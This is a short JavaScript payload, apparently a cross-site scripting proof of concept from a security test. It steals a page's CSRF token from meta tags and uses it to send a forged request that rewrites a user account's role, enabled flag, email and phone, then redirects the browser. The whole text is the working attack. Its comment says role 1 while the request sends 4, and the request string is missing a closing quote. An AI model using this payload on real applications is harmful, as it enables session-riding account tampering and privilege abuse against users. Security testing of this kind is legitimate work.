var xmlhttp = new XMLHttpRequest();
var meta = parent.document.getElementsByTagName('meta');

for (i=0; i<meta.length; i++) {
  if (meta[i].getAttribute("name") == "csrf-token") {
    var csrfToken = meta[i].getAttribute("content");
    confirm("Users CSRF token: "+csrfToken);

    //update this users account to role_id 1
    xmlhttp.open("POST","/account/users/1155-first-last",true);
    xmlhttp.setRequestHeader("X-CSRF-Token",csrfToken);
    
    
    xmlhttp.send("utf8=%E2%9C%93&_method=put&authenticity_token="+csrfToken+"&user%5Bfirst_name%5D=First&user%5Blast_name%5D=Last&user%5Brole_id%5D=4&user%5Benabled%5D=false&user%5Bemail%5D=user%40stratumsecurity.com&user_mobile_phone%5Bcountry%5D=US&user_mobile_phone%5Bphone_number%5D=2024556339&user_mobile_phone%5Baccepts_sms%5D=0&user_mobile_phone%5Baccepts_sms%5D=1&user_mobile_phone%5Baccepts_calls%5D=0&user_mobile_phone%5Baccepts_calls%5D=1&commit=Update+User);
  }
}

//redirect the user
window.location.replace("/account/users/1155-first-last");
